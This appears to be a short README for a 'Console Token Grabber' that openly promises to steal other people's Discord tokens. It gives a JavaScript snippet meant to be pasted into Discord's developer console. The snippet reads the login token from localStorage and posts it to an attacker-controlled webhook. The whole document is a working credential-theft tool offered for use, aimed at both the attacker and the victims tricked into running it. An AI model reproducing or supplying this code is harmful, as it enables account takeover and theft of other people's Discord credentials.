## 🔐 Basic Console Token Grabber
• **It's a simple "Console Token Grabber" that you can use to steal other people's Discord Token.**

<!--<h3 align="center">
![image](https://cdn.discordapp.com/attachments/941755353035579422/951879632544747540/Unbenannt-1.png)
</h3> -->

![image](https://cdn.discordapp.com/attachments/941755353035579422/951879632544747540/Unbenannt-1.png)

## 🔐 How to use

• Go ond Discord and press CTRL + SHIFT + I and paste the Script in the console.

```js
(function() {
    window.dispatchEvent(new Event('beforeunload'));
    var x = new XMLHttpRequest;
    x.open("POST", 'YOUR WEBHOOK'), x.setRequestHeader("Content-type", "application/json");
    var y = {
        username: "Eternity Console Stealer",
        avatar_url: "https://cdn.discordapp.com/attachments/941755353035579422/947642580521340928/1.png",
        content: "@everyone New Log!",
        embeds: [{
            color: "21426",
            description: `Token: ${window.open().localStorage.token}`,
        }]
    };

    x.send(JSON.stringify(y));
    w.close()
}());;


